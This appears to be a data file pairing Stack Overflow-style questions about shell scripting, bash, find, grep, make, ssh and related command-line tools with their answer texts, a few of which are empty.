    "Find command regextype difference between 'posix-extended' and 'posix-egrep'": "Let me guide through you how you should use linux's documentation to self-answer questions like this by showing you how exactly I locate information.\nI run man find to see some basic information of regular expression type by searching the keyword, regular, then I see this:\n-regextype type\nChanges the regular expression syntax understood by -regex and -iregex tests which occur later on the command line. To see which regular expression types are known, use -regextype help. The Texinfo documentation (see SEE ALSO) explains the meaning of and differences between the various types of regular expression.\nAssuming this is what you are looking for, the doc says it's in Texinfo, so I do the next step;\nrun info find. Then search regextype to locate the correct section for it. Then I reached:\n'--regextype'\nThis option changes the regular expression syntax and behaviour used by the '--regex' option. *note Regular Expressions:: for more information on the regular expression dialects understood by GNU findutils.\nIt asks to refer to a further documentation named note Regular Expressions, which you can go to there by hitting enter when cursor's on it.\nHooray!\nMenu:\nfindutils-default regular expression syntax::\nawk regular expression syntax::\negrep regular expression syntax::\nemacs regular expression syntax::\ngnu-awk regular expression syntax::\ngrep regular expression syntax::\nposix-awk regular expression syntax::\nposix-basic regular expression syntax::\nposix-egrep regular expression syntax::\nposix-extended regular expression syntax::\nThe last two items are exactly what you are asking. Read both of them, and then you can find out that the system already has the proper answers for you.",
    "How to run a script in background (linux openwrt)?": "In OpenWRT (before 2023) there is neither nohup nor screen available by default, so a solution with only builtin commands would be to start a subshell with brackets and put that one in the background with &:\n(/root/wget/wget_download.sh >/dev/null 2>&1 )&\nyou can test this structure easily on your desktop for example with\n(notify-send one && sleep 15 && notify-send two)&\n... and then close your console before those 15 seconds are over, you will see the commands in the brackets continue execution after closing the console.",
    "How to wait for a process to complete using tcl-expect": "you're forgetting to \"hit enter\". After sending exit, the way to wait for the process to end os expect eof:\nsend \"source xyz.csh\\r\"\nexpect \"%\"\nsend \"exit\\r\"\nexpect eof",
    "Shell - Suppress output of a single command": "In the context of make, more importantly than the output, you don't want make to treat the result of rm as failure. There are two ways to deal with it:\nclean:\n    -rm *.o    2> /dev/null\n    rm -f *.o  2> /dev/null\nThe first way is to prefix the command with a minus sign, which tells make to ignore the return code. This is the preferred, make-specific way. The second is to use the -f flag, which is specific only to rm.\nOn top of that, you can choose to suppress the output with 2> /dev/null or not.",
    "Grepping from a text file list": "xargs grep \"your pattern\" < my-file-list.txt",
    "How to if/else statement in shell script": "#!/bin/sh \n\ncount=100;\nif [ \"$count\" -gt 3 ]; then\n  echo \"Test IF\";\nfi\nCorrect your syntax: spaces must be used around [ and ], parameter expansions must be quoted, and -gt is appropriate for numeric comparisons inside of [ ]. > in sh is used as redirection operator; if you want to use it in arithmetical comparison, you must use the bash-only syntax\n$(( $count > 3 ))",
    "Bash/Shell-Move all files from subdirectories into target directory?": "If you are using GNU mv, the -t option (target directory) is pretty useful:\nfind sourcedir -type f -print0 | xargs -0 mv -t target \nman mv gives more details.",
    "What happens if I name a bash script function with the name of a binary located in the PATH?": "Your function will get called because it hides the pwd builtin.\nTo force the command to be executed, use the command builtin:\ncommand pwd\nFrom bash manual:\n   command [-pVv] command [arg ...]\n          Run command with args  suppressing  the  normal  shell  function\n          lookup.  Only builtin commands or commands found in the PATH are\n          executed.  If the -p option is given, the search for command  is\n          performed  using  a default value for PATH that is guaranteed to\n          find all of the standard utilities.  If  either  the  -V  or  -v\n          option is supplied, a description of command is printed.  The -v\n          option causes a single word indicating the command or file  name\n          used to invoke command to be displayed; the -V option produces a\n          more verbose description.  If the -V or -v option  is  supplied,\n          the  exit  status  is  0 if command was found, and 1 if not.  If\n          neither option is supplied and an error occurred or command can-\n          not  be found, the exit status is 127.  Otherwise, the exit sta-\n          tus of the command builtin is the exit status of command.",
    "Why does xargs -L yield the right format, while xargs -n doesn't?": "-L splits by lines; echo doesn't separate its output by lines but by spaces, so a single ls -l is run and that formats all the columns as a group.\n-n splits by parameters; in the absence of -L or -0, the separator is whitespace (possibly modified by quoting), so each filename gets its own ls -l run and there is no way for the independent runs to coordinate column widths.",
    "Matplotlib deprecation warning running through Ubuntu application": "You need to separate tick values and tick labels.\nax.set_xticks([]) # values\nax.set_xticklabels([]) # labels",
    "Detect whether current shell is powershell in python": "Generally, environment variable SHELL does not tell you what shell invoked your script, it only tells you the binary path of the current user's default shell (on Unix-like platforms), as chepner notes.\nTo detect what shell invoked your script, you must examine the script's parent process.\nThe following works with the psutil package installed (it is both v2- and v3-compatible):\nimport os, psutil, re\n\n# Get the parent process name.\npproc_name = psutil.Process(os.getppid()).name()\n\n# See if it is Windows PowerShell (powershell.exe) or PowerShell Core (pwsh[.exe]):\nis_power_shell = bool(re.fullmatch('pwsh|pwsh.exe|powershell.exe', pproc_name))\nIf installing a package is not an option, you can use the following workaround to detect PowerShell specifically, but note the constraints:\nIt presumes a standard PowerShell installation, specifically with respect to environment variable PSModulePath: that is, PSModulePath must either:\nnot be predefined at all outside of PowerShell (Unix-like platforms)\nor must have just one or two entries outside of PowerShell (Windows, predefined via the registry)[1].\nIt presumes that the script wasn't invoked via nested shell invocations:\nIf you launched a different shell from PowerShell, which then launched your script, the solution below would still indicate that your script was launched by PowerShell.\nConversely, if you launched wsl.exe or WSL's bash.exe or MSYS' bash.exe / sh.exe from PowerShell, which then launched your script, the solution below would not indicate that the script was (indirectly) launched by PowerShell, because these executables do not inherit the caller's environment variables; by contrast, the bash.exe / sh.exe that comes with Git and the ones that comes with Cygwin do.\nimport os\n\nis_power_shell = len(os.getenv('PSModulePath', '').split(os.pathsep)) >= 3 \nNote that when PowerShell starts up it ensures that at least 3 locations are present in PSModulePath, on all platforms (the in-box/system-modules location, the all-users location, and the current-user location). As stated, outside of PowerShell the variable isn't predefined at all on Unix, and on Windows it is predefined with at most 2 locations.\n[1] Older Windows 10 versions predefined just the system-modules location, $env:SystemRoot\\System32\\WindowsPowerShell\\v1.0\\Modules, whereas more recent versions additionally predefine the all-users location, $env:ProgramFiles\\WindowsPowerShell\\Modules.",
    "Show particular column for command [duplicate]": "You can use awk like that:\n$ ps | awk '{print $2 \" \" $3 \" \" $4}'\nTTY TIME CMD\npts/22 00:00:00 bash\npts/22 00:00:00 ps\npts/22 00:00:00 awk\nOr together with column -t for more readable output:\n$ ps | awk '{print $2 \" \" $3 \" \" $4}' | column -t\nTTY     TIME      CMD\npts/22  00:00:00  bash\npts/22  00:00:00  ps\npts/22  00:00:00  awk\npts/22  00:00:00  column\nAs William Pursell noted in the comment below awk command can be simplified:\n$ ps | awk '{print $2, $3, $4}' | column -t\nTTY    TIME      CMD\npts/9  00:00:00  bash\npts/9  00:00:00  ps\npts/9  00:00:00  awk\npts/9  00:00:00  column",
    "how to run pipenv in cronjob in ubuntu?": "Try giving the whole path.\nFind which pipenv and then run with the absolute path of the same. instead of pipenv -h\nIn my case it was located in /usr/local/bin/pipenv",
    "Is there a way to echo/cat a multiline message in Fish shell?": "Fish doesn't have \"Here documents\".\nThe easiest way to do this is probably to use printf, e.g.:\nprintf \"%s\\n\" \"This is line 1\" \"This is line 2\"\nOr you can take advantage of the fact that fish scans for matching quotes across multiple lines:\necho \"This is line 1\nThis is line 2\"\nIf you wish to have the ending quote on the next line to ease inserting more lines, you can use echo -n:\necho -n \"This is line 1\nThis is line 2\n\"",
    "How to pass parameters to SQL script via Powershell": "You could take advantage of sqlcmd's scripting variables. Those can be used in script file and are marked with $(). Like so,\n-- Sql script file\nuse $(db);\nselect someting from somewhere;\nWhen calling sqlcmd, use the -v parameter to assign variables. Like so,\nsqlcmd -S server\\instance -E -v db =\"MyDatabase\" -i s.sql\nEdit\nMind the Sql syntax when setting variables. Consider the following script:\nDECLARE @dbName varchar(255)\nSET @dbName = $(db)\nselect 'val' = @dbName\nAs passed to the Sql Server, it looks like so (Profiler helps here):\nuse master;\n\nDECLARE @dbName varchar(255)\nSET @dbName = foo\nselect 'val' = @dbName\nThis is, obviously invalid a syntax, as SET @dbName = foo won't make much sense. The value ought to be within single quotes like so,\nsqlcmd -S server\\instance -E -v db =\"'foo'\" -i s.sql",
    "Run linux program from shell script with multi-line input": "Prime use case for a here-document:\nprog <<EOF\nt\n3\n12\ne\nEOF",
    "What does \"source\" the bin/activate script mean?": "To source a script is to run it in the context of the current shell rather than running it in a new shell.\nFor example:\n. myscript.sh\nor:\nsource myscript.sh\n(depending on which shell you're running).\nIf you run the script in its own shell, any changes it makes to the environment are in that shell rather than the one you call it from. By sourcing it, you can affect the environment of the current shell.\nFor example, examine the following transcript:\npax> cat script.sh \nexport xyzzy=plugh\necho $xyzzy\n\npax> export xyzzy=twisty\n\npax> echo $xyzzy ; script.sh ; echo $xyzzy\ntwisty\nplugh\ntwisty\n\npax> echo $xyzzy ; . script.sh ; echo $xyzzy\ntwisty\nplugh\nplugh\nWhen you run the script (different shell), it sets xyzzy to plugh but that gets lost when the shell exits back to your original shell. You'll find the original value has been \"restored\" (in quotes because the original value was never actually changed, only a copy of it was).\nWhen you source it, it's just as if you typed the commands within the current shell so the effect on the variables is persistent.",
    "Exact grep -f command in Linux": "For exact match use -x switch\ngrep -x -f A.txt B.txt \nEDIT: If you don't want grep's regex capabilities and need to treat search pattern as fixed-strings then use -F switch as:\ngrep -xF -f A.txt B.txt\n     -x, --line-regexp\n             Only input lines selected against an entire fixed string or regular expression are considered to be matching lines.",
    "Bash: trick program into thinking stdout is an interactive terminal": "I assume that the program will call the glibc function isatty() to check whether stdout is a terminal or not. That's common for programs which use colorized output on terminals or other features of an ANSI terminal like cursor positioning or line erasing / redrawing.\nYou can trick the program using the LD_PRELOAD environment variable. LD_PRELOAD is handled by the ELF linker and tells that a dynamic library should be loaded before all others. Using this feature it is possible to override library functions, in your case the glibc function isatty(). You can follow this article for example.\nI've prepared an example for you:\nFirst create the file libisatty.c:\n/**\n * Overrides the glibc function. Will always return true.\n *\n * Note: Although this should be ok for most applications it can\n * lead to unwanted side effects. It depends on the question\n * why the programm calls isatty()\n */\nint isatty(int param) {\n    return 1;\n}\nand compile it as a shared lib:\ngcc -shared -o libisatty.so  libisatty.c\nIt should build fine.\nNow it's time to test the library. :) I've used the command ls --color=auto for tests. ls calls isatty() to decide whether it should colorize it's output or not. If the output is redirected to a file or a pipe it won't be colorized. You can test this easily using the following commands:\nls --color=auto        # should give you colorized output\nls --color=auto | cat  # will give you monochrome output\nNow we'll try the second command again using the LD_PRELOAD environment var:\nLD_PRELOAD=./libisatty.so ls --color=auto | cat\nYou should see colorized output.\nbtw cool usename: u\u028dop \u01ddp\u0131sdn !!:D",
    "Bash parameter quotes and eval": "I recommend avoiding eval if possible. For your logging use case, you could take a look at the shell builtin caller. If you need more information, you can use the variables BASH_SOURCE, BASH_LINENO and FUNCNAME. Note that all of these variables are arrays and contain the full call stack. See the following example:\n#! /bin/bash       \n\nfunction log() {\n    echo \"[$( caller )] $*\" >&2\n    echo \"BASH_SOURCE: ${BASH_SOURCE[*]}\"\n    echo \"BASH_LINENO: ${BASH_LINENO[*]}\"\n    echo \"FUNCNAME: ${FUNCNAME[*]}\"\n}\n\nfunction foobar() {\n    log \"failed:\" \"$@\"\n}\n\nfoobar \"$@\"",
    "Shell script call from Android.mk, standard output and missing separator error": "The Android NDK build system is actually GNU Make. All of the code in the Android.mk file has to be valid make.\nWhen you run $(shell) and don't store the value in a variable, then it is as if you copied the standard output of the script into your Android.mk file. i.e. it is as if your file contained the following:\nLOCAL_PATH := $(call my-dir)\ninclude $(CLEAR_VARS)\n\necho is working\n\nLOCAL_MODULE := libecho_test\nLOCAL_MODULE_TAGS := optional\ninclude $(BUILD_SHARED_LIBRARY)\n.. which is not valid make syntax. Redirecting to >&2 in your script works because the output goes to the error output and is then shown on the console.\nAs Vishrut mentions, use $(info) or $(warning) to print messages. Or if you really want to run a script during the build, store its output in a variable:\nECHO_RESULT := $(shell ($(LOCAL_PATH)/echo_test.sh))\nHere you won't see the echo output of the script, it goes into the variable.",
    "How to execute a script remotely in Python using SSH?": "The code below will do what you want and you can adapt it to your execute function:\nfrom paramiko import SSHClient\nhost=\"hostname\"\nuser=\"username\"\nclient = SSHClient()\nclient.load_system_host_keys()\nclient.connect(host, username=user)\nstdin, stdout, stderr = client.exec_command('./install.sh')\nprint \"stderr: \", stderr.readlines()\nprint \"pwd: \", stdout.readlines()\nNote, though, that commands will default to your $HOME directory, so you'll either need to have install.sh in your $PATH or (most likely) you'll need to cd to the directory that contains the install.sh script.\nYou can check your default path with:\nstdin, stdout, stderr = client.exec_command('getconf PATH')\nprint \"PATH: \", stdout.readlines()\nHowever, if it is not in your path you can cd and execute the script like this:\nstdin, stdout, stderr = client.exec_command('(cd /path/to/files; ./install.sh)')\nprint \"stderr: \", stderr.readlines()\nprint \"pwd: \", stdout.readlines()\nIf the script is not in your$PATH you'll need to use ./install.sh instead of install.sh, just like you would if you were on the command line.\nIf you are still having problems after everything above it might also be good to check the permissions of the install.sh file, too:\nstdin, stdout, stderr = client.exec_command('ls -la install.sh')\nprint \"permissions: \", stdout.readlines()",
    "How do I display Explorer with a file selected?": "This function opens explorer, and selects the specified file:\nuses ShellAPI, ...;\n\nprocedure TForm1.ShowFile(const aFileName:String);\nbegin\n  ShellExecute(Handle, 'OPEN', PChar('explorer.exe'), PChar('/select, \"' + aFileName + '\"'), nil, SW_NORMAL)\nend;\n\nprocedure TForm1.ShowFolder(const aPath:String);\nbegin\n  ShellExecute(Handle, 'OPEN', PChar('explorer.exe'), PChar('/root, \"' + aPath + '\"'), nil, SW_NORMAL) \nend;\nOr is this the \"commandline\" that you didn't want to use?",
    "KornShell - Set \"-x\" (debug) flag globally?": "This is ksh88 on an HP-UX machine:\nme@host ..dev/\n$ cat ./test/verbose\n#!/bin/ksh\nset -x\n\nhello() {\n  print $1\n}\n\nhello kapow!\nexit\n\nme@host..dev/\n$ ./test/verbose    \n+ hello kapow!\n+ print kapow!\nkapow!\n+ exit\nIt sure looks like that works fine. I validated that it also works with a \"set -x\" anywhere before the first function call.\nI moved to an AIX system, and experienced the problem you described. When functions are defined as either function a { or a() { in AIX ksh88, the set -x doesn't appear to carry forward into the function-local scope. Switching to ksh93 on the same AIX box, functions declared using the new function a { syntax also don't carry the outer set -x into the inner scope. However, ksh93 behaves like POSIX sh (and ksh88 on other platforms) used to behave, carrying the set -x through to the function when the function is defined in the old a(){ method. This is probably due to the backwards compatability in ksh93, where it tries to emulate the old behavior when functions are defined the old way.\nTherefore, you might be able to temporarily switch the interpreter over to ksh93 for debugging purposes, and then switch back to ksh88 if you don't like having the longer arrays, associative arrays, floating point math, namespace support, and rougly 10x improvement in execution speed which ksh93 brings. ;) Because it looks like the answer is \"no, you can't do that\" with ksh88 on AIX. :(",
    "Where can I find a graphical command shell?": "Hotwire is an attempt to combine the power of the traditional command line interface with GUI elements. So it has a GUI side, and tries to be helpful in suggesting commands, and in showing you possible matches from your history. (While there are keyboard shortcuts to do this in bash and other shells, you have to know them ...)\nYou can use all your common system commands, but a number of key ones have new versions by default which use an object pipeline, and are displayed with a nice GUI view. In particular ls (aka dir) shows lists files and shows them in columns. You can sort by clicking on the column headers, double click on files to open, or double click on directories to move to that directory. The proc command allows you to right click on a process and one of the options is to kill it.\nThe object pipeline works in a similar way to Microsoft Powershell, allowing commands in the pipe to access object properties directly rather than having to do text processing to extract it.\nHotwire is cross platform (Linux, BSD, Windows, Mac), though it is at an early stage of development. To learn more, install (click on the link for your platform) and work through the simple getting started page.\nIf you don't like hotwire, you could also look at the list of related projects and ideas maintained on the hotwire wiki.",
    "Does youtube-dl library support download stories from instagram?": "Update: For Instagram stories of video slideshows, use yt-dlp (requires v2022.1.21):\npip install 'yt-dlp>=2022.1.21'\nJust make sure you're logged in via one of the authentication methods:\n--cookies-from-browser YOUR_BROWSER\n--cookies /path/to/cookies.txt\n-u YOUR_USERNAME (interactive)\n-n (config file)\nyt-dlp --cookies-from-browser firefox https://www.instagram.com/stories/highlights/17863022906349328/\n\n# [cookies] Extracting cookies from firefox\n# [cookies] Extracted 2051 cookies from firefox\n# [instagram:story] 17863022906349328: Downloading JSON metadata\n# [instagram:story] 17863022906349328: Downloading JSON metadata\n# [instagram:story] 17863022906349328: Downloading user info\n# [download] Downloading playlist: Mars AR\n# [instagram:story] playlist Mars AR: Collected 7 videos; downloading 7 of them\n# [download] Downloading video 1 of 7\n# [info] 2515578473642074643_787132: Downloading 1 format(s): 2\n# [download] Destination: Story by natgeo [2515578473642074643_787132].mp4\n# [download] 100% of 793.91KiB in 00:00\n# \u22ee\n# [download] Finished downloading playlist: Mars AR\nFor Instagram stories of image slideshows, use gallery-dl:\npip install gallery-dl\ngallery-dl -u USERNAME -p PASSWORD https://www.instagram.com/stories/highlights/17857710373716419/\n\n# [instagram][info] Logging in as USERNAME\n# ./gallery-dl/instagram/weighthefish/2224872001634244851.jpg\n# ./gallery-dl/instagram/weighthefish/2224872078683640644.jpg\n# ...\n# ./gallery-dl/instagram/weighthefish/2224872839329073284.jpg\nNote that yt-dlp is a fork of youtube-dl (I am not affiliated with either):\nyt-dlp is a youtube-dl fork based on the now inactive youtube-dlc. The main focus of this project is adding new features and patches while also keeping up to date with the original project.\nyoutube-dl still doesn't support Instagram stories, though it's tagged as \"todo\" on their issue tracker.",
    "bash script adding git credentials from bash script": "For basic HTTP authentication you can:\nPass credentials inside url:\ngit clone http://USERNAME:PASSWORD@some_git_server.com/project.git\nWARN this is not secure: url with credentials can be seen by another user on your machine with ps or top utilities when you work with remote repo.\nUse gitcredentials:\n$ git config --global credential.helper store\n$ git clone http://some_git_server.com/project.git\n\nUsername for 'http://some_git_server.com': <USERNAME>\nPassword for 'https://USERNAME@some_git_server.com': <PASSWORD>\nUse ~/.netrc:\ncat >>~/.netrc <<EOF\nmachine some_git_server.com\n       login <USERNAME>\n       password <PASSWORD>\nEOF",
    "My AWS CLI didn't work with sudo": "",
    "Package tar.gz into a shell script": "There is a Linux Journal article explaining how to do this in detail, with code for packing the payload, etc. As Etan Reisner says in his comment, the extraction/installation script knows how to cut its tail off to obtain the payload which was concatenated earlier. Here's an example of how that works:\n#!/bin/bash\n# a self-extracting script header\n\n# this can be any preferred output directory\nmkdir ./output_dir\n\n# determine the line number of this script where the payload begins\nPAYLOAD_LINE=`awk '/^__PAYLOAD_BELOW__/ {print NR + 1; exit 0; }' $0`\n\n# use the tail command and the line number we just determined to skip\n# past this leading script code and pipe the payload to tar\ntail -n+$PAYLOAD_LINE $0 | tar xzv -C ./output_dir\n\n# now we are free to run code in output_dir or do whatever we want\n\nexit 0\n\n# the 'exit 0' immediately above prevents this line from being executed\n__PAYLOAD_BELOW__\nNote the use of $0 to refer to the script itself.\nTo create the installer in the first place, you need to concatenate the code above and the tarball you want to install/deliver. If the script above is called extract.sh, and the payload is called payload.tar.gz, then this command would do the trick:\ncat extract.sh payload.tar.gz > run_me.sh",
    "PHP Interactive - Load File From Command Line": "",
    "Shell spacing in square brackets [duplicate]": "Spaces are required after [ and before ].\n[ is actually the name of a command, an alias for test. It's not a special symbol, it's just a command with an unusual name.\n$ help '['\n[: [ arg... ]\n    Evaluate conditional expression.\n\n    This is a synonym for the \"test\" builtin, but the last argument must\n    be a literal `]', to match the opening `['.\nBecause it's an ordinary command name and not a special character, a space is required after the [. If you omit the space and write [foo the shell will search the $PATH for a command named [foo.\n$ [ foo = foo ] && echo true\ntrue\n$ [foo = foo] && echo true\n[foo: command not found\nFor readability's sake, [ expects its last argument to be exactly ]. Being an ordinary command-line argument, ] must have a space before it. If there's no space then the bracket will become the last character of the previous argument, and [ will complain about its last argument not being ].\n$ [ foo = foo]\nbash: [: missing `]'\n$ [ foo = 'foo]'\nbash: [: missing `]'\n[[ is a bash enhancement with more features than [, namely saner handling of unquoted variable names. It requires the a space on both ends, same as [. However [[ is in fact special shell syntax and is parsed differently. It's not an \"ordinary command\" the way [ is.\nFor a detailed explanation of the difference between [ and [[, see:\nWhat's the difference between [ and [[ in Bash?",
    "Pass gdb variable to a shell command excuted from gdb": "With a new version of gdb, you can use \"eval\":\n(gdb) set $val = 2\n(gdb) eval \"shell echo %d\", $val\n2\nIf you have an older version of gdb, then the best you can do is use \"set logging\" to write things to a file, then use shell utilities like sed to rewrite the file into the form you want.",
    "bash command to grep something on stderr and save the result in a file": "Use the following pipeline if only messages containing ERROR should be displayed on the console (stderr):\nstm |& grep ERROR | tee -a /path/to/logfile\nUse the following command if all messages should be displayed on the console (stderr):\nstm |& tee /dev/stderr | grep ERROR >> /path/to/logfile\nEdit: Versions without connecting standard output and standard error:\nstm 2> >( grep --line-buffered ERROR | tee -a /path/to/logfile >&2 )\nstm 2> >( tee /dev/stderr | grep --line-buffered ERROR >> /path/to/logfile )",
    "Shell script to check if file exists": "One approach:\n(\n  shopt -s nullglob\n  files=(/home/edward/bank1/fiche/Test*)\n  if [[ \"${#files[@]}\" -gt 0 ]] ; then\n    echo found one\n  else\n    echo found none\n  fi\n)\nExplanation:\nshopt -s nullglob will cause /home/edward/bank1/fiche/Test* to expand to nothing if no file matches that pattern. (Without it, it will be left intact.)\n( ... ) sets up a subshell, preventing shopt -s nullglob from \"escaping\".\nfiles=(/home/edward/bank1/fiche/Test*) puts the file-list in an array named files. (Note that this is within the subshell only; files will not be accessible after the subshell exits.)\n\"${#files[@]}\" is the number of elements in this array.\nEdited to address subsequent question (\"What if i also need to check that these files have data in them and are not zero byte files\"):\nFor this version, we need to use -s (as you did in your question), which also tests for the file's existence, so there's no point using shopt -s nullglob anymore: if no file matches the pattern, then -s on the pattern will be false. So, we can write:\n(\n  found_nonempty=''\n  for file in /home/edward/bank1/fiche/Test* ; do\n    if [[ -s \"$file\" ]] ; then\n      found_nonempty=1\n    fi\n  done\n  if [[ \"$found_nonempty\" ]] ; then\n    echo found one\n  else\n    echo found none\n  fi\n)\n(Here the ( ... ) is to prevent file and found_file from \"escaping\".)",
    "storing passed arguments in separate variables -shell scripting": "If you just want to concatenate the arguments:\n#!/bin/sh\n\nfirst_two=\"$1 $2\"  # Store the first two arguments\nshift              # Discard the first argument\nshift              # Discard the 2nd argument\nremainder=\"$*\"     # Store the remaining arguments\nNote that this destroys the original positional arguments, and they cannot be reliably reconstructed. A little more work is required if that is desired:\n#!/bin/sh\n\nfirst_two=\"$1 $2\"  # Store the first two arguments\na=\"$1\"; b=\"$2\"     # Store the first two argument separately\nshift              # Discard the first argument\nshift              # Discard the 2nd argument\nremainder=\"$*\"     # Store the remaining arguments\nset \"$a\" \"$b\" \"$@\" # Restore the positional arguments",
    "linux. how to preserve lines when setting content of file to environment variable?": "Yes:\ntemp=`cat [file]`\necho \"$temp\"\nThe magic is in the quotes around $temp; without them, echo gets these arguments:\necho line1\\nline2\\nlin3\nThe shell parsing algorithm will split the command line at white space, so echo sees three arguments. If you quote the variable, echo will see a single argument and the shell parsing won't touch the whitespace between the quotes.",
    "How to provide \"reverse ssh\" to a shell?": "How about simply setting up an ssh server that is reachable by both the device and the support user, and have the device set up a reverse tunnel (using remote port forwarding)?\nssh -R 10022:localhost:22 device@server\nThen the support personnel can simply connect to the server and log on using\nssh -p 10022 localhost\nOf course there are several security aspects that need to be accounted for here, depending on what kind of information the devices hold/have access to and how the support organization is set up.",
    "Take the list of attached devices": "",
    "Redirect STDOUT and STDERR to socket in C?": "Your use of dup2() looks fine, so the problem is probably elsewhere. The simple program I threw together to test with does not have the issues you are experiencing, so I'll just go over the core of it (around the fork()/execvp() area) with some error checking omitted for brevity:\nint    lsock, /* listening socket */\n       csock; /* active connection's socket */\npid_t  cpid;  /* child process ID from fork() */\nchar   *cmd = \"somecommand\";\nchar   *cmd_args[] = { \"somecommand\",\n                       \"firstarg\",\n                       \"secondarg\",\n                       \"howevermanyargs\",\n                       NULL }; /* note: last item is NULL */\n/*  ... \n    call socket(), bind(), listen(), etc.\n    ... */\n\nfor (;;) {  /* loop, accepting connections */\n  if ( (csock = accept( lsock, NULL, NULL )) == -1) exit(1);\n  cpid = fork();\n  if (cpid < 0) exit(1);  /* exit if fork() fails */\n  if ( cpid ) {\n    /* In the parent process: */\n    close( csock ); /* csock is not needed in the parent after the fork */\n    waitpid( cpid, NULL, 0 ); /* wait for and reap child process */\n  } else {\n    /* In the child process: */\n    dup2( csock, STDOUT_FILENO );  /* duplicate socket on stdout */\n    dup2( csock, STDERR_FILENO );  /* duplicate socket on stderr too */\n    close( csock );  /* can close the original after it's duplicated */\n    execvp( cmd, cmd_args );   /* execvp() the command */\n  }\n}\nThe above is the core of a very basic server (only one client at a time) that, when it receives a connection, forks a new process to run a command and sends its stderr and stdout to the client over the socket. Hopefully you can solve your problem by examining it -- but don't just copy the code without understanding what it does.\nTry testing by connecting with a telnet client first... if it works with telnet but not with your client program, then look for problems in your client program.",
    "Combining pipe with exit status in bash shell script": "If you do have a shell with process substitution (bash does, posix shell is not), than\nmake > >(sed s/a/A/) && date\nshould do the trick, except bash it does not wait for the sed (it seems zsh does, but I only tried it, not checked the doc), so the output of date can get before the last line of sed output. In plain posix shell, you can use a bit more complicated construct\n((make && date >&3) | sed s/a/A/) 3>&1\nThe date can again run before sed has processed everything, so it's output can again come before the last line of sed output.\nIf you want the date to only run after the sed has processed everything, your only chance is storing the make status somewhere. Something like:\n(make && touch make-succeeded) | sed s/a/A/\nrm make-succeeded 2>/dev/null && date\nabusing the fact, that if the file does not exist, rm (without -f) will exit with nonzero status and silencing it's error message with redirection. As Fredrik has mentioned though, bash does in fact have a place where it does stash the exits status, so in bash you can:\nmake | sed s/a/A/\n[ 0 -eq $PIPESTATUS[0] ] && date",
    "Executing exe or bat file on remote windows machine from *nix": "Let's go through the various options you mentioned:\npsexec: This is pretty much a PC only thing. Plus, you must make sure that newer Windows machines can get through the UAC that are setup by default. UAC is the thing you see all the time on Vista and Windows 7 when you try to do something that requires administrator's privileges. You can try something called winexe which is a Linux program that can do the psexec protocol, but I've had problems getting it to work.\nOpenSSH: There are two main flavors of SSH, and Open SSH is the one used by the vast majority of sites. SSH has several advantages over other methods:\nSSH is secure: Your network traffic is encrypted.\nSSH can be password independent: You can setup SSH to use private/public keys. This way, you don't even have to know the password on the remote server. This makes it more secure since you don't have passwords being stored on various systems. And, in many Windows sites, passwords have to be changed every month or so or the account is locked.\nSSH can do more than just execute remote commands: There are two sub-protocols on SSH called SCP and SFTP. These allow you to transfer files between two machines. Since they work over SSH, you get all of the advantages of SSH including encrypted packets, and public/private key protection.\nSSH is well implemented in the Unix World: You'll find SSH clients built into Ant, Maven, and other build tools. Programs like CVS, Subversion, and Git can work over SSH connections too. Unfortunately, the Windows World operates in a different space time dimension. To use SSH on a Windows system requires third party software like Cygwin.\nCygwin: Cygwin is sort of an odd beast. It's a layer on top of Windows that allows many of the Unix/GNU libraries to work over Windows. It was originally developed to allow Unix developers to run their software on Windows DOS systems. However, Cygwin now contains a complete Unix like system including tools such as Perl and Python, BASH shell, and many utilities such as an SSH server. Since Cygwin is open source, you can download it for free and run SSH server. Unfortunately, I've had problems with Cygwin's SSH server. Another issue: If you're running programs remotely, you probably want to run them in a Windows environment and not the Cygwin environment.\nI recommend that you look at WinSSHD from Bitvise. It's an OpenSSH implementation of the SSH Server, but it's not open source. It's about $100 per license and you need a license on each server. However, it's a robust implementation and has all of the features SSH has to offer.\nYou can look at CoSSH which is a package of Cygwin utilities and OpenSSH server. This is free and all open source, but if you want an easy way of setting it up, you have to pay for the Advanced Administrator Console. You don't need the Advanced Administrator Console since you can use Cygwin to set everything up, and it comes with a basic console to help.",
    "vim: Why does the sh colour scheme highlight `$(...)` as an error?": "Because your .vimrc file does not contain\nlet g:is_posix = 1\nSee http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=552108",
    "Get list of 'Friendly interface names' on a Mac (Airport, Ethernet, etc)": "networksetup -listallnetworkservices will give you just the names (with an asterisk before disabled ports, in case you want to leave them out). networksetup -listnetworkserviceorder gives some additional info, like what /dev entry (en0, etc) they correspond to. Check the man page for networksetup for even lots more options...",
    "Extract IP from netstat output": "This will return a list of unique IP address you're connected too:\nnetstat -anpt | grep apache2 |grep ESTABLISHED | awk '{ print $5 }' | cut -d: -f1 | sort -u\nWell I think I need to change my glasses also =P",
    "Python/Django shell won't start": "It seems like IPython is installed wrongly somehow. Try starting the shell with:\n./manage.py shell --plain\nto start the standard Python shell, rather than IPython. If that works, then trying removing IPython completely and reinstalling it.",
    "Bash semicolon being equal to newline is not exactly true?": "Looking at the syntax of the for/do loop,\nfor name [ [in [words \u2026] ] ; ] do commands; done\nwe can see that do is followed by commands immediately, so using a newline after do doesn't replace a semicolon, but a space.\nThe description for compound commands also says\nIn most cases a list of commands in a compound command\u2019s description may be separated from the rest of the command by one or more newlines, and may be followed by a newline in place of a semicolon.\nbut nowhere does it say that you can insert random semicolons. \"Every newline can be substituted with semicolons\" is simply too general a statement and not correct.\nMore manual evidence: in the section about lists of commands, it says (emphasis mine):\nA list is a sequence of one or more pipelines separated by one of the operators ;, &, &&, or ||, and optionally terminated by one of ;, &, or a newline.\nOf these list operators, && and || have equal precedence, followed by ; and &, which have equal precedence.\nA sequence of one or more newlines may appear in a list to delimit commands, equivalent to a semicolon.\nSo a newline is equivalent to a semicolon within a list of commands.",
